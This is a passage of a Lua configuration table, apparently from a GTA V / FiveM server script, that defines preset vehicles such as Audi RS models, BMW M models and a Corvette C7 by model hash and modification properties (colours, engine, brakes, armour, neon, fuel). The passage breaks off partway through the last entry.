			{name = 'Audi R8 V10', props = {["modLivery"] = -1,["xenonColor"] = 255,["model"] = -1183566390,["extras"] = { } ,["modTurbo"] = 1,["suspensionRaise"] = -0.070000000298023,["dirtLevel"] = 6.4,["modWindows"] = -1,["bodyHealth"] = 1000.0,["modTransmission"] = 2,["modSideSkirt"] = -1,["modHood"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSmokeEnabled"] = 1,["modArchCover"] = -1,["modTrimA"] = -1,["engineHealth"] = 1000.0,["modAirFilter"] = -1,["modTrimB"] = -1,["modAerials"] = -1,["modStruts"] = -1,["modGrille"] = -1,["modHydrolic"] = -1,["pearlescentColor"] = 12,["modTrunk"] = -1,["modSpeakers"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["modDial"] = -1,["modSeats"] = -1,["fuelLevel"] = 60.0,["modArmor"] = 4,["modSteeringWheel"] = -1,["modShifterLeavers"] = -1,["modFrontWheels"] = -1,["modAPlate"] = -1,["modXenon"] = 1,["windowTint"] = 1,["modFrame"] = 0,["modDashboard"] = -1,["modOrnaments"] = -1,["color2"] = 89,["wheels"] = 7,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modBackWheels"] = -1,["modSuspension"] = 2,["modPlateHolder"] = -1,["modDoorSpeaker"] = -1,["modRightFender"] = -1,["modBrakes"] = 2,["modEngine"] = 3,["modFender"] = -1,["color1"] = 89,["modExhaust"] = -1,["modRoof"] = -1,["modHorns"] = -1,["modTank"] = -1,["modSpoilers"] = 1,["plateIndex"] = 1,["wheelColor"] = 12,["modEngineBlock"] = -1,["modRearBumper"] = -1,["modVanityPlate"] = -1,["modFrontBumper"] = 1,}},
			{name = 'Audi RS3', props = {["modSteeringWheel"] = -1,["suspensionRaise"] = -0.050000004470348,["bodyHealth"] = 1000.0,["modFrontBumper"] = 4,["modLivery"] = -1,["modVanityPlate"] = -1,["modAPlate"] = -1,["extras"] = { } ,["modWindows"] = -1,["xenonColor"] = 255,["modTrimB"] = -1,["pearlescentColor"] = 12,["modTank"] = -1,["modTurbo"] = 1,["color1"] = 12,["modAirFilter"] = -1,["windowTint"] = 1,["modSideSkirt"] = 0,["color2"] = 27,["modSpeakers"] = -1,["fuelLevel"] = 60.0,["modArchCover"] = -1,["wheels"] = 0,["dirtLevel"] = 10.3,["modEngineBlock"] = -1,["modStruts"] = -1,["modSpoilers"] = -1,["modPlateHolder"] = -1,["modXenon"] = 1,["modRearBumper"] = -1,["modRightFender"] = -1,["modDial"] = -1,["modFrontWheels"] = -1,["modGrille"] = -1,["modHydrolic"] = -1,["modTrunk"] = -1,["modFrame"] = -1,["modAerials"] = -1,["modSmokeEnabled"] = 1,["modDashboard"] = -1,["modDoorSpeaker"] = -1,["modSeats"] = -1,["modSuspension"] = 3,["modTransmission"] = 2,["plateIndex"] = 4,["modShifterLeavers"] = -1,["wheelColor"] = 27,["modArmor"] = 4,["modTrimA"] = -1,["modFender"] = -1,["modBackWheels"] = -1,["modOrnaments"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["model"] = -1029368191,["modHorns"] = -1,["modBrakes"] = 2,["modEngine"] = 3,["modRoof"] = -1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["engineHealth"] = 1000.0,["modHood"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modExhaust"] = 2,}},
			{name = 'Audi RS3 2018', props = {["modSteeringWheel"] = -1,["suspensionRaise"] = -0.029999995604157,["bodyHealth"] = 1000.0,["modFrontBumper"] = 0,["modLivery"] = -1,["modVanityPlate"] = -1,["modAPlate"] = -1,["extras"] = { ["6"] = true,} ,["modWindows"] = -1,["xenonColor"] = 255,["modTrimB"] = -1,["pearlescentColor"] = 12,["modTank"] = -1,["modTurbo"] = 1,["color1"] = 134,["modAirFilter"] = -1,["windowTint"] = 1,["modSideSkirt"] = 2,["color2"] = 12,["modSpeakers"] = -1,["fuelLevel"] = 60.0,["modArchCover"] = -1,["wheels"] = 0,["dirtLevel"] = 9.3,["modEngineBlock"] = -1,["modStruts"] = -1,["modSpoilers"] = -1,["modPlateHolder"] = -1,["modXenon"] = 1,["modRearBumper"] = 0,["modRightFender"] = -1,["modDial"] = -1,["modFrontWheels"] = -1,["modGrille"] = 1,["modHydrolic"] = -1,["modTrunk"] = -1,["modFrame"] = 2,["modAerials"] = -1,["modSmokeEnabled"] = 1,["modDashboard"] = -1,["modDoorSpeaker"] = -1,["modSeats"] = -1,["modSuspension"] = 4,["modTransmission"] = 2,["plateIndex"] = 1,["modShifterLeavers"] = -1,["wheelColor"] = 28,["modArmor"] = 4,["modTrimA"] = -1,["modFender"] = -1,["modBackWheels"] = -1,["modOrnaments"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["model"] = 216350205,["modHorns"] = -1,["modBrakes"] = 2,["modEngine"] = 3,["modRoof"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["engineHealth"] = 1000.0,["modHood"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modExhaust"] = 0,}},
			{name = 'Audi RS4 Avant', props = {["modLivery"] = -1,["xenonColor"] = 255,["model"] = -2019421579,["extras"] = { ["3"] = true,} ,["modTurbo"] = 1,["suspensionRaise"] = -0.029999999329448,["dirtLevel"] = 10.1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["modTransmission"] = 2,["modSideSkirt"] = 1,["modHood"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSmokeEnabled"] = 1,["modArchCover"] = -1,["modTrimA"] = -1,["engineHealth"] = 1000.0,["modAirFilter"] = -1,["modTrimB"] = -1,["modAerials"] = -1,["modStruts"] = -1,["modGrille"] = -1,["modHydrolic"] = -1,["pearlescentColor"] = 0,["modTrunk"] = -1,["modSpeakers"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["modDial"] = -1,["modSeats"] = -1,["fuelLevel"] = 60.0,["modArmor"] = 4,["modSteeringWheel"] = -1,["modShifterLeavers"] = -1,["modFrontWheels"] = -1,["modAPlate"] = -1,["modXenon"] = 1,["windowTint"] = 1,["modFrame"] = -1,["modDashboard"] = -1,["modOrnaments"] = -1,["color2"] = 12,["wheels"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modBackWheels"] = -1,["modSuspension"] = 4,["modPlateHolder"] = -1,["modDoorSpeaker"] = -1,["modRightFender"] = -1,["modBrakes"] = 2,["modEngine"] = 3,["modFender"] = -1,["color1"] = 12,["modExhaust"] = -1,["modRoof"] = 0,["modHorns"] = -1,["modTank"] = -1,["modSpoilers"] = 2,["plateIndex"] = 1,["wheelColor"] = 12,["modEngineBlock"] = -1,["modRearBumper"] = -1,["modVanityPlate"] = -1,["modFrontBumper"] = 3,}},
			{name = 'Audi RS5 2014', props = {["modLivery"] = 0,["xenonColor"] = 255,["model"] = -1362824500,["extras"] = { } ,["modTurbo"] = 1,["suspensionRaise"] = -0.03999999538064,["dirtLevel"] = 4.1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["modTransmission"] = 2,["modSideSkirt"] = 0,["modHood"] = 2,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSmokeEnabled"] = 1,["modArchCover"] = -1,["modTrimA"] = -1,["engineHealth"] = 1000.0,["modAirFilter"] = -1,["modTrimB"] = -1,["modAerials"] = -1,["modStruts"] = -1,["modGrille"] = 2,["modHydrolic"] = -1,["pearlescentColor"] = 12,["modTrunk"] = -1,["modSpeakers"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["modDial"] = -1,["modSeats"] = -1,["fuelLevel"] = 60.0,["modArmor"] = 4,["modSteeringWheel"] = -1,["modShifterLeavers"] = -1,["modFrontWheels"] = -1,["modAPlate"] = -1,["modXenon"] = 1,["windowTint"] = -1,["modFrame"] = 1,["modDashboard"] = -1,["modOrnaments"] = -1,["color2"] = 29,["wheels"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modBackWheels"] = -1,["modSuspension"] = 2,["modPlateHolder"] = -1,["modDoorSpeaker"] = -1,["modRightFender"] = -1,["modBrakes"] = 2,["modEngine"] = 3,["modFender"] = -1,["color1"] = 23,["modExhaust"] = -1,["modRoof"] = -1,["modHorns"] = -1,["modTank"] = -1,["modSpoilers"] = -1,["plateIndex"] = 4,["wheelColor"] = 27,["modEngineBlock"] = -1,["modRearBumper"] = 1,["modVanityPlate"] = -1,["modFrontBumper"] = 2,}},
			{name = 'Audi RS6', props = {["modLivery"] = 0,["xenonColor"] = 255,["model"] = -1379807831,["extras"] = { } ,["modTurbo"] = 1,["suspensionRaise"] = -0.03999999910593,["dirtLevel"] = 4.2,["modWindows"] = -1,["bodyHealth"] = 1000.0,["modTransmission"] = 2,["modSideSkirt"] = -1,["modHood"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSmokeEnabled"] = 1,["modArchCover"] = -1,["modTrimA"] = -1,["engineHealth"] = 1000.0,["modAirFilter"] = -1,["modTrimB"] = -1,["modAerials"] = -1,["modStruts"] = -1,["modGrille"] = 1,["modHydrolic"] = -1,["pearlescentColor"] = 12,["modTrunk"] = -1,["modSpeakers"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["modDial"] = -1,["modSeats"] = -1,["fuelLevel"] = 60.0,["modArmor"] = 4,["modSteeringWheel"] = -1,["modShifterLeavers"] = -1,["modFrontWheels"] = -1,["modAPlate"] = -1,["modXenon"] = 1,["windowTint"] = 1,["modFrame"] = 0,["modDashboard"] = -1,["modOrnaments"] = -1,["color2"] = 28,["wheels"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modBackWheels"] = -1,["modSuspension"] = 2,["modPlateHolder"] = -1,["modDoorSpeaker"] = -1,["modRightFender"] = -1,["modBrakes"] = 2,["modEngine"] = 3,["modFender"] = 0,["color1"] = 12,["modExhaust"] = -1,["modRoof"] = -1,["modHorns"] = -1,["modTank"] = -1,["modSpoilers"] = -1,["plateIndex"] = 1,["wheelColor"] = 12,["modEngineBlock"] = -1,["modRearBumper"] = 1,["modVanityPlate"] = -1,["modFrontBumper"] = 2,}},
			{name = 'Audi RS7 2016', props = {["modLivery"] = 0,["xenonColor"] = 255,["model"] = -1071770374,["extras"] = { } ,["modTurbo"] = 1,["suspensionRaise"] = -0.03999999910593,["dirtLevel"] = 8.2,["modWindows"] = -1,["bodyHealth"] = 1000.0,["modTransmission"] = 2,["modSideSkirt"] = -1,["modHood"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSmokeEnabled"] = 1,["modArchCover"] = -1,["modTrimA"] = -1,["engineHealth"] = 1000.0,["modAirFilter"] = -1,["modTrimB"] = -1,["modAerials"] = -1,["modStruts"] = -1,["modGrille"] = -1,["modHydrolic"] = -1,["pearlescentColor"] = 12,["modTrunk"] = -1,["modSpeakers"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["modDial"] = -1,["modSeats"] = -1,["fuelLevel"] = 60.0,["modArmor"] = 4,["modSteeringWheel"] = -1,["modShifterLeavers"] = -1,["modFrontWheels"] = -1,["modAPlate"] = -1,["modXenon"] = 1,["windowTint"] = 1,["modFrame"] = -1,["modDashboard"] = -1,["modOrnaments"] = -1,["color2"] = 28,["wheels"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modBackWheels"] = -1,["modSuspension"] = 3,["modPlateHolder"] = -1,["modDoorSpeaker"] = -1,["modRightFender"] = -1,["modBrakes"] = 2,["modEngine"] = 3,["modFender"] = -1,["color1"] = 12,["modExhaust"] = -1,["modRoof"] = -1,["modHorns"] = -1,["modTank"] = -1,["modSpoilers"] = -1,["plateIndex"] = 4,["wheelColor"] = 0,["modEngineBlock"] = -1,["modRearBumper"] = -1,["modVanityPlate"] = -1,["modFrontBumper"] = 0,}},
			{name = 'Audi RSQ7 2016', props = {["modSteeringWheel"] = -1,["suspensionRaise"] = 0.0,["bodyHealth"] = 1000.0,["modFrontBumper"] = 0,["modLivery"] = -1,["modVanityPlate"] = -1,["modAPlate"] = -1,["extras"] = { ["1"] = true,["4"] = false,["3"] = false,} ,["modWindows"] = -1,["xenonColor"] = 255,["modTrimB"] = -1,["pearlescentColor"] = 12,["modTank"] = -1,["modTurbo"] = 1,["color1"] = 12,["modAirFilter"] = -1,["windowTint"] = 1,["modSideSkirt"] = -1,["color2"] = 3,["modSpeakers"] = -1,["fuelLevel"] = 65.0,["modArchCover"] = -1,["wheels"] = 3,["dirtLevel"] = 4.5,["modEngineBlock"] = -1,["modStruts"] = -1,["modSpoilers"] = 0,["modPlateHolder"] = -1,["modXenon"] = 1,["modRearBumper"] = 0,["modRightFender"] = 0,["modDial"] = -1,["modFrontWheels"] = -1,["modGrille"] = -1,["modHydrolic"] = -1,["modTrunk"] = -1,["modFrame"] = 0,["modAerials"] = -1,["modSmokeEnabled"] = 1,["modDashboard"] = -1,["modDoorSpeaker"] = -1,["modSeats"] = -1,["modSuspension"] = 3,["modTransmission"] = 2,["plateIndex"] = 1,["modShifterLeavers"] = -1,["wheelColor"] = 1,["modArmor"] = 4,["modTrimA"] = -1,["modFender"] = 0,["modBackWheels"] = -1,["modOrnaments"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["model"] = 119794591,["modHorns"] = -1,["modBrakes"] = 2,["modEngine"] = 3,["modRoof"] = -1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["engineHealth"] = 1000.0,["modHood"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modExhaust"] = -1,}},
		
			{name = 'BMW 850 CSi', props = { ["modOrnaments"] = -1,["modTrimB"] = -1,["modTank"] = -1,["modFrontBumper"] = 1,["suspensionRaise"] = -0.019999999552965,["fuelLevel"] = 60.0,["modLivery"] = 0,["modBrakes"] = 2,["windowTint"] = 1,["modSideSkirt"] = 0,["modEngineBlock"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["pearlescentColor"] = 12,["modDoorSpeaker"] = -1,["modTransmission"] = 2,["modRoof"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSuspension"] = 3,["modTrunk"] = -1,["dirtLevel"] = 2.0,["modSteeringWheel"] = -1,["xenonColor"] = 255,["modArchCover"] = -1,["model"] = 444286472,["modAPlate"] = -1,["modHood"] = 0,["wheelColor"] = 28,["modRightFender"] = -1,["modXenon"] = 1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["engineHealth"] = 1000.0,["modHydrolic"] = -1,["modExhaust"] = 0,["modSmokeEnabled"] = 1,["modShifterLeavers"] = -1,["modSeats"] = -1,["extras"] = { } ,["modArmor"] = 4,["modTurbo"] = 1,["modTrimA"] = -1,["color1"] = 112,["modEngine"] = 3,["modVanityPlate"] = -1,["wheels"] = 0,["modFender"] = -1,["modPlateHolder"] = -1,["modRearBumper"] = 0,["modHorns"] = -1,["modFrontWheels"] = -1,["modBackWheels"] = -1,["modAirFilter"] = -1,["modDashboard"] = -1,["plateIndex"] = 4,["modDial"] = -1,["modStruts"] = -1,["modGrille"] = -1,["color2"] = 28,["modFrame"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSpeakers"] = -1,["modSpoilers"] = 0,["modAerials"] = -1,}},
			{name = 'BMW M3 F80', props = {["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["fuelLevel"] = 60.0,["suspensionRaise"] = -0.03999999538064,["modLivery"] = -1,["modWindows"] = -1,["modDashboard"] = -1,["bodyHealth"] = 1000.0,["windowTint"] = -1,["xenonColor"] = 255,["wheels"] = 0,["color1"] = 12,["modOrnaments"] = -1,["modXenon"] = 1,["modTrimB"] = -1,["modSeats"] = -1,["modAerials"] = 0,["modArchCover"] = 2,["modStruts"] = -1,["modArmor"] = 4,["modTransmission"] = 2,["extras"] = { ["2"] = false,["1"] = false,} ,["pearlescentColor"] = 12,["modSideSkirt"] = 0,["modTrunk"] = -1,["modAirFilter"] = -1,["modFrontWheels"] = -1,["modVanityPlate"] = 1,["modHydrolic"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modBackWheels"] = -1,["modSteeringWheel"] = -1,["modSpeakers"] = -1,["modSpoilers"] = 0,["modExhaust"] = 0,["modAPlate"] = -1,["color2"] = 28,["modDial"] = -1,["modRoof"] = 1,["modPlateHolder"] = 0,["modTank"] = -1,["modTrimA"] = -1,["modEngineBlock"] = 0,["modEngine"] = 3,["plateIndex"] = 1,["modRearBumper"] = 2,["modDoorSpeaker"] = -1,["modSmokeEnabled"] = 1,["modGrille"] = 1,["modTurbo"] = 1,["dirtLevel"] = 8.4,["modSuspension"] = 3,["modHorns"] = -1,["modHood"] = 1,["modBrakes"] = 2,["model"] = -580610645,["modShifterLeavers"] = -1,["modFender"] = -1,["wheelColor"] = 0,["modRightFender"] = -1,["engineHealth"] = 1000.0,["modFrame"] = 0,["modFrontBumper"] = 2,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,}}},
			{name = 'BMW M4 F82', props = {["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["fuelLevel"] = 60.0,["suspensionRaise"] = -0.049999997019768,["modLivery"] = 0,["modWindows"] = -1,["modDashboard"] = -1,["bodyHealth"] = 1000.0,["windowTint"] = 1,["xenonColor"] = 255,["wheels"] = 0,["color1"] = 134,["modOrnaments"] = -1,["modXenon"] = 1,["modTrimB"] = -1,["modSeats"] = -1,["modAerials"] = -1,["modArchCover"] = -1,["modStruts"] = -1,["modArmor"] = 4,["modTransmission"] = 3,["extras"] = { } ,["pearlescentColor"] = 134,["modSideSkirt"] = -1,["modTrunk"] = -1,["modAirFilter"] = -1,["modFrontWheels"] = -1,["modVanityPlate"] = -1,["modHydrolic"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modBackWheels"] = -1,["modSteeringWheel"] = -1,["modSpeakers"] = -1,["modSpoilers"] = 0,["modExhaust"] = 0,["modAPlate"] = -1,["color2"] = 111,["modDial"] = -1,["modRoof"] = -1,["modPlateHolder"] = -1,["modTank"] = -1,["modTrimA"] = -1,["modEngineBlock"] = -1,["modEngine"] = 3,["plateIndex"] = 1,["modRearBumper"] = 1,["modDoorSpeaker"] = -1,["modSmokeEnabled"] = 1,["modGrille"] = -1,["modTurbo"] = 1,["dirtLevel"] = 3.3,["modSuspension"] = 3,["modHorns"] = -1,["modHood"] = 0,["modBrakes"] = 3,["model"] = 909765281,["modShifterLeavers"] = -1,["modFender"] = -1,["wheelColor"] = 156,["modRightFender"] = -1,["engineHealth"] = 1000.0,["modFrame"] = -1,["modFrontBumper"] = 0,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,}}},
			{name = 'BMW M5 E60', props = { ["modOrnaments"] = -1,["modTrimB"] = -1,["modTank"] = -1,["modFrontBumper"] = 0,["suspensionRaise"] = -0.0099999997764826,["fuelLevel"] = 60.0,["modLivery"] = 2,["modBrakes"] = 2,["windowTint"] = 1,["modSideSkirt"] = -1,["modEngineBlock"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["pearlescentColor"] = 12,["modDoorSpeaker"] = -1,["modTransmission"] = 2,["modRoof"] = 0,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSuspension"] = 3,["modTrunk"] = -1,["dirtLevel"] = 9.0,["modSteeringWheel"] = -1,["xenonColor"] = 255,["modArchCover"] = 0,["model"] = 1969115674,["modAPlate"] = -1,["modHood"] = -1,["wheelColor"] = 134,["modRightFender"] = -1,["modXenon"] = 1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["engineHealth"] = 1000.0,["modHydrolic"] = -1,["modExhaust"] = 0,["modSmokeEnabled"] = 1,["modShifterLeavers"] = -1,["modSeats"] = -1,["extras"] = { ["12"] = true,} ,["modArmor"] = 4,["modTurbo"] = 1,["modTrimA"] = -1,["color1"] = 134,["modEngine"] = 3,["modVanityPlate"] = -1,["wheels"] = 0,["modFender"] = -1,["modPlateHolder"] = 0,["modRearBumper"] = -1,["modHorns"] = -1,["modFrontWheels"] = -1,["modBackWheels"] = 3,["modAirFilter"] = -1,["modDashboard"] = -1,["plateIndex"] = 1,["modDial"] = -1,["modStruts"] = -1,["modGrille"] = 0,["color2"] = 0,["modFrame"] = -1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSpeakers"] = -1,["modSpoilers"] = -1,["modAerials"] = 0,}},
			{name = 'BMW M5 F90', props = {["suspensionRaise"] = -0.059999998658895,["modSpoilers"] = 6,["modShifterLeavers"] = -1,["modTank"] = -1,["modXenon"] = 1,["modBackWheels"] = -1,["windowTint"] = 1,["modWindows"] = -1,["modRearBumper"] = 1,["modDashboard"] = -1,["color1"] = 134,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["modArchCover"] = -1,["modStruts"] = -1,["modAerials"] = -1,["modEngineBlock"] = -1,["modHydrolic"] = -1,["extras"] = { ["1"] = true,} ,["modSeats"] = -1,["modTrunk"] = -1,["modFender"] = -1,["model"] = 1093697054,["engineHealth"] = 1000.0,["modDial"] = -1,["color2"] = 2,["dirtLevel"] = 8.2,["modSpeakers"] = -1,["modAPlate"] = -1,["modDoorSpeaker"] = -1,["modSuspension"] = 3,["modSteeringWheel"] = -1,["modBrakes"] = 2,["pearlescentColor"] = 12,["modHorns"] = -1,["fuelLevel"] = 60.0,["modFrontBumper"] = 3,["modOrnaments"] = -1,["modGrille"] = 1,["modAirFilter"] = -1,["modRightFender"] = -1,["modPlateHolder"] = -1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modExhaust"] = 0,["modTrimA"] = -1,["modVanityPlate"] = -1,["modFrame"] = -1,["modTrimB"] = -1,["xenonColor"] = 255,["modSmokeEnabled"] = 1,["wheelColor"] = 89,["modArmor"] = 4,["modTransmission"] = 2,["bodyHealth"] = 1000.0,["modFrontWheels"] = -1,["modHood"] = 2,["modSideSkirt"] = 1,["modRoof"] = 0,["modLivery"] = -1,["modTurbo"] = 1,["wheels"] = 0,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modEngine"] = 3,["plateIndex"] = 1,}},
			{name = 'BMW M6 F13', props = {["modHydrolic"] = -1,["modFender"] = -1,["modLivery"] = -1,["modFrontBumper"] = -1,["windowTint"] = 1,["modTrimB"] = -1,["modAerials"] = -1,["wheelColor"] = 156,["fuelLevel"] = 59.9,["modTrimA"] = -1,["pearlescentColor"] = 12,["modVanityPlate"] = -1,["modFrame"] = -1,["suspensionRaise"] = -0.079999998211861,["modRearBumper"] = -1,["wheels"] = 0,["modEngine"] = 3,["modDoorSpeaker"] = -1,["modShifterLeavers"] = -1,["modAPlate"] = -1,["modSteeringWheel"] = -1,["modSeats"] = -1,["modRoof"] = -1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modDial"] = -1,["modTurbo"] = 1,["dirtLevel"] = 3.9,["modSmokeEnabled"] = 1,["modDashboard"] = -1,["modBrakes"] = 2,["modRightFender"] = -1,["modBackWheels"] = -1,["modExhaust"] = -1,["model"] = 1897898727,["color2"] = 8,["modArchCover"] = -1,["xenonColor"] = 255,["engineHealth"] = 1000.0,["modAirFilter"] = -1,["modPlateHolder"] = -1,["modOrnaments"] = -1,["modFrontWheels"] = -1,["modXenon"] = 1,["extras"] = { ["1"] = false,["2"] = false,} ,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["color1"] = 12,["modSpoilers"] = -1,["modArmor"] = 4,["modSuspension"] = 3,["modHorns"] = -1,["bodyHealth"] = 1000.0,["modTank"] = -1,["modSpeakers"] = -1,["modTrunk"] = -1,["modGrille"] = -1,["modEngineBlock"] = -1,["modSideSkirt"] = -1,["modWindows"] = -1,["plateIndex"] = 1,["modTransmission"] = 2,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["modHood"] = -1,["modStruts"] = -1,}},
			{name = 'BMW M8', props = {["modOrnaments"] = -1,["modTrimB"] = -1,["modTank"] = -1,["modFrontBumper"] = -1,["suspensionRaise"] = 0.0049999998882413,["fuelLevel"] = 60.0,["modLivery"] = 0,["modBrakes"] = 2,["windowTint"] = 1,["modSideSkirt"] = -1,["modEngineBlock"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["pearlescentColor"] = 12,["modDoorSpeaker"] = -1,["modTransmission"] = 2,["modRoof"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSuspension"] = 3,["modTrunk"] = -1,["dirtLevel"] = 3.6,["modSteeringWheel"] = -1,["xenonColor"] = 255,["modArchCover"] = -1,["model"] = -1404319008,["modAPlate"] = -1,["modHood"] = -1,["wheelColor"] = 28,["modRightFender"] = -1,["modXenon"] = 1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["engineHealth"] = 1000.0,["modHydrolic"] = -1,["modExhaust"] = -1,["modSmokeEnabled"] = 1,["modShifterLeavers"] = -1,["modSeats"] = -1,["extras"] = { ["10"] = true,} ,["modArmor"] = 4,["modTurbo"] = 1,["modTrimA"] = -1,["color1"] = 12,["modEngine"] = 3,["modVanityPlate"] = -1,["wheels"] = 0,["modFender"] = -1,["modPlateHolder"] = -1,["modRearBumper"] = -1,["modHorns"] = -1,["modFrontWheels"] = -1,["modBackWheels"] = 3,["modAirFilter"] = -1,["modDashboard"] = -1,["plateIndex"] = 1,["modDial"] = -1,["modStruts"] = -1,["modGrille"] = -1,["color2"] = 28,["modFrame"] = -1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSpeakers"] = -1,["modSpoilers"] = -1,["modAerials"] = -1,}},
			{name = 'BMW X6M', props = {["modOrnaments"] = -1,["modTrimB"] = -1,["modTank"] = -1,["modFrontBumper"] = 0,["suspensionRaise"] = -0.12999999523163,["fuelLevel"] = 60.0,["modLivery"] = 1,["modBrakes"] = 2,["windowTint"] = 1,["modSideSkirt"] = 0,["modEngineBlock"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["pearlescentColor"] = 12,["modDoorSpeaker"] = -1,["modTransmission"] = 2,["modRoof"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSuspension"] = 3,["modTrunk"] = -1,["dirtLevel"] = 3.6,["modSteeringWheel"] = -1,["xenonColor"] = 255,["modArchCover"] = -1,["model"] = -506359117,["modAPlate"] = -1,["modHood"] = 0,["wheelColor"] = 12,["modRightFender"] = -1,["modXenon"] = 1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["engineHealth"] = 1000.0,["modHydrolic"] = -1,["modExhaust"] = 1,["modSmokeEnabled"] = 1,["modShifterLeavers"] = -1,["modSeats"] = -1,["extras"] = { ["1"] = true,} ,["modArmor"] = 4,["modTurbo"] = 1,["modTrimA"] = -1,["color1"] = 12,["modEngine"] = 3,["modVanityPlate"] = -1,["wheels"] = 3,["modFender"] = -1,["modPlateHolder"] = -1,["modRearBumper"] = 0,["modHorns"] = -1,["modFrontWheels"] = -1,["modBackWheels"] = -1,["modAirFilter"] = -1,["modDashboard"] = -1,["plateIndex"] = 1,["modDial"] = -1,["modStruts"] = -1,["modGrille"] = -1,["color2"] = 28,["modFrame"] = -1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSpeakers"] = -1,["modSpoilers"] = 0,["modAerials"] = -1,}},
			
			{name = 'Chevrolet Corvette C7', props =  {["modOrnaments"] = -1,["modTrimB"] = -1,["modTank"] = -1,["modFrontBumper"] = 1,["suspensionRaise"] = -0.059999998658895,["fuelLevel"] = 60.0,["modLivery"] = 0,["modBrakes"] = 2,["windowTint"] = 1,["modSideSkirt"] = 0,["modEngineBlock"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["pearlescentColor"] = 12,["modDoorSpeaker"] = -1,["modTransmission"] = 2,["modRoof"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSuspension"] = 3,["modTrunk"] = -1,["dirtLevel"] = 6.4,["modSteeringWheel"] = -1,["xenonColor"] = 255,["modArchCover"] = -1,["model"] = 874739883,["modAPlate"] = -1,["modHood"] = 0,["wheelColor"] = 12,["modRightFender"] = -1,["modXenon"] = 1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["engineHealth"] = 1000.0,["modHydrolic"] = -1,["modExhaust"] = -1,["modSmokeEnabled"] = 1,["modShifterLeavers"] = -1,["modSeats"] = -1,["extras"] = { ["1"] = true,} ,["modArmor"] = 4,["modTurbo"] = 1,["modTrimA"] = -1,["color1"] = 134,["modEngine"] = 3,["modVanityPlate"] = -1,["wheels"] = 0,["modFender"] = 